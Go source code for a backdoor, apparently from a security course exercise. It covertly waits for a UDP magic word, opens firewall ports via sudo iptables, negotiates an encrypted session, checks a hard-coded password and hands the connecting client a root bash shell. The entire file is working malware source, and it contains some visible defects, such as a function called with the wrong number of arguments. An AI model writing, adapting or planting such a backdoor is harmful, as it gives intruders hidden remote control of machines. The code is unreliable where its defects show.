package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/ecdh"
	"crypto/hmac"
	"crypto/rand"
	"crypto/sha256"
	"flag"
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"os/signal"
	"syscall"
	"time"

	"golang.org/x/crypto/hkdf"
)

const (
	CONN_PORT    = "3333"
	CONN_UDPPORT = "6666"
	CONN_TYPE    = "tcp"
	CONN_TIMEOUT = 2
	PORT_TIMEOUT = 3
)

func seal(msg []byte, info []byte, gcm cipher.AEAD) []byte {
	nonce := make([]byte, gcm.NonceSize())
	rand.Read(nonce)
	ct := gcm.Seal(nonce, nonce, msg, info)
	return ct
}

func open(buf []byte, info []byte, gcm cipher.AEAD) ([]byte, error) {
	nonce := buf[:gcm.NonceSize()]
	ct := buf[gcm.NonceSize():]
	return gcm.Open(nil, nonce, ct, info)
}

func errThread(stderr io.ReadCloser, conn net.Conn, gcm cipher.AEAD, info []byte) {
	buf := make([]byte, 1024)
	for {
		r, err := stderr.Read(buf)
		if err != nil {
			break
		}
		ct := seal(buf[:r], info, gcm)
		conn.Write(ct)
	}
}

func sendThread(stdout io.ReadCloser, conn net.Conn, gcm cipher.AEAD, info []byte) {
	buf := make([]byte, 1024)
	for {
		r, err := stdout.Read(buf)
		// The process pipe has closed
		if err != nil {
			break
		}
		ct := seal(buf[:r], info, gcm)
		conn.Write(ct)
	}
}

func recvThread(stdin io.WriteCloser, conn net.Conn, gcm cipher.AEAD, info []byte) {
	buf := make([]byte, 1052)
	for {
		r, err := conn.Read(buf)
		// The connection has closed from the other end
		if err != nil {
			stdin.Write([]byte("exit\n"))
			break
		}
		pt, err := open(buf[:r], info, gcm)
		if err != nil {
			stdin.Write([]byte("exit\n"))
			break
		}
		stdin.Write(pt)
		first := len(string(pt)) > 3 && string(pt[:3]) == "cd "
		second := len(string(pt)) == 3 && string(pt[:2]) == "cd"
		// Is a directory change
		if first || second {
			ct := seal([]byte(""), info, gcm)
			if first {
				// Check validity
				path := string(pt[3 : len(pt)-1])
				err := os.Chdir(path)
				if err != nil {
					continue
				}
			} else if second {
				path, _ := os.UserHomeDir()
				os.Chdir(path)
			}
			conn.Write(ct)
		}
	}
}

func endConnection(conn net.Conn) {
	fmt.Println("Closing connection...")
	conn.Close()
}

// Handles initial connection from a client to this backdoor
func handleConnection(conn net.Conn, local bool) {
	defer endConnection(conn)
	fmt.Printf("Serving %s\n", conn.RemoteAddr().String())
	var priv, _ = ecdh.Curve.GenerateKey(ecdh.X25519(), rand.Reader)
	var pub = priv.PublicKey()

	// First packet sent by client is supposed to be a public key
	// of length 32, and is also supposed to be on the curve
	buf := make([]byte, 1024)
	conn.SetDeadline(time.Now().Add(PORT_TIMEOUT * time.Second))
	readLen, err := conn.Read(buf)
	if err != nil || readLen != 32 {
		println("Wrong length")
		return
	}
	// Bytes to public key
	remote, err := ecdh.X25519().NewPublicKey(buf[:readLen])
	if err != nil {
		return
	}

	// Compute shared key
	shared, err := priv.ECDH(remote)
	if err != nil {
		println("Unable to compute shared key")
		return
	}
	kdf := hkdf.New(sha256.New, shared, nil, nil)
	var gcmKey [32]byte
	var hmacKey [32]byte
	kdf.Read(gcmKey[:])
	kdf.Read(hmacKey[:])

	// Make a cipher
	c, _ := aes.NewCipher(gcmKey[:])
	gcm, _ := cipher.NewGCM(c)

	// Make an associated data with all of our sent packets
	info := []byte(conn.LocalAddr().String() + conn.RemoteAddr().String())
	hm := hmac.New(sha256.New, hmacKey[:])
	hm.Write(info)
	info = hm.Sum(nil)

	// Send the client our public key
	writeLen, err := conn.Write(pub.Bytes())
	if err != nil || writeLen != 32 {
		fmt.Println("Unable to send our public key")
		return
	}

	// Check that the next message is the correct password
	readLen, err = conn.Read(buf)
	if err != nil || writeLen != 32 {
		fmt.Println("Unable to read from port")
		return
	}
	tempBuf := buf[:readLen]
	pt, err := open(tempBuf, info, gcm)
	if err != nil {
		fmt.Println("Decryption failed")
		return
	}
	if string(pt) != "foobar" {
		fmt.Println("Wrong magic word for protocol")
		return
	}

	// Ack the connection, password is correct
	_, err = conn.Write(seal([]byte("ack"), info, gcm))
	if err != nil || writeLen != 32 {
		fmt.Println("Unable to write to port")
		return
	}

	// Start the shell
	fmt.Println("Starting bash")
	var bash *exec.Cmd
	if local {
		bash = exec.Command("bash")
	} else {
		bash = exec.Command("sudo", "strace", "-o", "/dev/null", "/bin/bash")
	}
	stdin, _ := bash.StdinPipe()
	stdout, _ := bash.StdoutPipe()
	stderr, _ := bash.StderrPipe()
	bash.Start()

	// No deadlines, we've established a connection with the client
	conn.SetDeadline(time.Time{})
	// Start thread for listening and sending
	go errThread(stderr, conn, gcm, info[:])
	go sendThread(stdout, conn, gcm, info[:])
	go recvThread(stdin, conn, gcm, info[:])
	bash.Wait()
}

func openUDPRules(local bool) {
	if !local {
		openInPort := exec.Command("sudo", "strace", "-o", "/dev/null", "iptables", "-I", "INPUT", "-p", "udp", "--dport", CONN_UDPPORT, "-j", "ACCEPT")
		openOutPort := exec.Command("sudo", "strace", "-o", "/dev/null", "iptables", "-I", "OUTPUT", "-p", "udp", "--dport", CONN_UDPPORT, "-j", "ACCEPT")
		openInPort.Run()
		openOutPort.Run()
	}
}

func openTCPRules(local bool) {
	if !local {
		openInPort := exec.Command("sudo", "strace", "-o", "/dev/null", "iptables", "-I", "INPUT", "-p", "tcp", "--dport", CONN_PORT, "-j", "ACCEPT")
		openOutPort := exec.Command("sudo", "strace", "-o", "/dev/null", "iptables", "-I", "OUTPUT", "-p", "tcp", "--dport", CONN_PORT, "-j", "ACCEPT")
		openInPort.Run()
		openOutPort.Run()
	}
}

func deleteUDPRules(local bool) {
	if !local {
		closeInPort := exec.Command("sudo", "strace", "-o", "/dev/null", "iptables", "-D", "INPUT", "-p", "udp", "-m", "udp", "--dport", CONN_UDPPORT, "-j", "ACCEPT")
		closeOutPort := exec.Command("sudo", "strace", "-o", "/dev/null", "iptables", "-D", "OUTPUT", "-p", "udp", "-m", "udp", "--dport", CONN_UDPPORT, "-j", "ACCEPT")
		closeInPort.Run()
		closeOutPort.Run()
	}
}

func deleteTCPRules(local bool) {
	if !local {
		closeInPort := exec.Command("sudo", "strace", "-o", "/dev/null", "iptables", "-D", "INPUT", "-p", "tcp", "-m", "tcp", "--dport", CONN_PORT, "-j", "ACCEPT")
		closeOutPort := exec.Command("sudo", "strace", "-o", "/dev/null", "iptables", "-D", "OUTPUT", "-p", "tcp", "-m", "tcp", "--dport", CONN_PORT, "-j", "ACCEPT")
		closeInPort.Run()
		closeOutPort.Run()
	}
}

// Function provided by which works pretty well for the week4 machine
// given only one non-loopaback address
// https://stackoverflow.com/questions/23558425/how-do-i-get-the-local-ip-address-in-go
func GetLocalIP() string {
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		return ""
	}
	for _, address := range addrs {
		// check the address type and if it is not a loopback the display it
		if ipnet, ok := address.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			if ipnet.IP.To4() != nil {
				return ipnet.IP.String()
			}
		}
	}
	return ""
}

func main() {
	var local = flag.Bool("l", false, "for setting local testing")
	flag.Parse()
	var CONN_HOST string
	if *local {
		CONN_HOST = "localhost"
	} else {
		CONN_HOST = GetLocalIP()
	}

	// Makes sure we close iptables ports before forcefully quitting
	c := make(chan os.Signal)
	signal.Notify(c, os.Interrupt, syscall.SIGTERM)
	go func() {
		<-c
		fmt.Println("CLEANING UP IPTABLES")
		deleteUDPRules(*local)
		deleteTCPRules(*local)
		os.Exit(1)
	}()

	// Goroutine for TCP connection
	fmt.Println("Listening on " + CONN_HOST + ":" + CONN_PORT)
	tcpAddr, _ := net.ResolveTCPAddr(CONN_TYPE, CONN_HOST+":"+CONN_PORT)
	connAttempt := make(chan bool)
	connReady := make(chan bool)
	go func() {
		for {
			deleteTCPRules(*local)
			connReady <- true
			<-connAttempt
			openTCPRules(*local)
			sock, err := net.ListenTCP(CONN_TYPE, tcpAddr)
			if err != nil {
				fmt.Println("Error listening:", err.Error())
				os.Exit(1)
			}
			sock.SetDeadline(time.Now().Add(CONN_TIMEOUT * time.Second))
			conn, err := sock.Accept()
			sock.Close()
			if err != nil {
				fmt.Println("Error accepting: ", err.Error())
				continue
			}

			handleConnection(conn)
		}
	}()

	// This part below silently listens for the magic word
	// to open up the tcp port
	udpAddr, _ := net.ResolveUDPAddr("udp", CONN_HOST+":"+CONN_UDPPORT)
	buf := make([]byte, 1024)
	conn, err := net.ListenUDP("udp", udpAddr)
	if err != nil {
		fmt.Println("Error listening:", err.Error())
		os.Exit(1)
	}
	for {
		<-connReady
		openUDPRules(*local)
		for {
			r, _ := conn.Read(buf)
			msg := string(buf[:r])
			if msg == "!@fizzbuzz@!" {
				fmt.Println("Received a connection request, opening TCP port...")
				break
			}
		}
		deleteUDPRules(*local)
		connAttempt <- true
	}
}
